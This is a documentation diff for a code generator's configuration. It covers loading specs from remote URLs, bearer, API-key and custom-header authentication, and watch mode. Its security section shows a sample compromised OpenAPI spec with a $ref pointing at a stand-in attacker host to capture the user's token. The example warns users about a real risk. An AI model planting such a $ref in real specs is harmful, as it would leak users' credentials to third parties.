@@ -127,3 +127,86 @@ export default {
   ]
 };
 ```
+
+## Remote URL inputs
+
+`inputPath` accepts an `http://` or `https://` URL in addition to a local
+file path. The same configuration field is used for AsyncAPI, OpenAPI, and
+JSON Schema inputs:
+
+```javascript
+export default {
+  inputType: 'asyncapi',
+  inputPath: 'https://example.com/specs/asyncapi.yaml',
+  language: 'typescript',
+  generators: [
+    { preset: 'payloads', outputPath: './src/payloads' }
+  ]
+};
+```
+
+Format detection prefers the response `Content-Type` header
+(`application/json` → JSON, `*yaml*` → YAML), falling back to the URL
+extension and finally to JSON-then-YAML for ambiguous cases.
+
+External `$ref` targets (e.g. `$ref:
+'https://example.com/components.yaml#/components/schemas/Pet'`) are also
+resolved over the same code path for AsyncAPI and OpenAPI inputs.
+
+### Authenticating remote requests
+
+For specs hosted behind authentication, configure the `auth` field. Three
+shapes are supported:
+
+```javascript
+// Bearer token
+auth: { type: 'bearer', token: process.env.API_TOKEN }
+
+// API key in a custom header
+auth: { type: 'apiKey', header: 'X-API-Key', value: process.env.API_KEY }
+
+// Arbitrary headers
+auth: {
+  type: 'custom',
+  headers: {
+    Authorization: `Bearer ${process.env.API_TOKEN}`,
+    'X-Tenant': 'acme'
+  }
+}
+```
+
+The `auth` field is ignored when `inputPath` is a local file path.
+
+### Auth scope and security considerations
+
+**The configured authentication headers are sent to every URL the loader
+fetches**, including:
+
+- The root `inputPath` URL.
+- Every external `$ref` target the parser libraries follow during
+  dereferencing — even when the `$ref` points at a different host.
+
+This is the right default for typical internal-SSO setups where the root
+spec and its `$ref` chain share an auth boundary, but it means that **a
+compromised spec can exfiltrate your token**:
+
+```yaml
+# Compromised spec at https://api.example.com/openapi.yaml
+openapi: 3.0.0
+paths:
+  /users:
+    get:
+      responses:
+        '200':
+          content:
+            application/json:
+              schema:
+                $ref: 'https://attacker.example/exfil.yaml'   # ← receives your token
+```
+
+### Watch mode
+
+`--watch` only observes the local filesystem. When `inputPath` is a
+remote URL, the input watcher is skipped and a warning is logged. Use
+`--watchPath` to watch a local file that triggers regeneration (which
+will re-fetch the URL) on change.
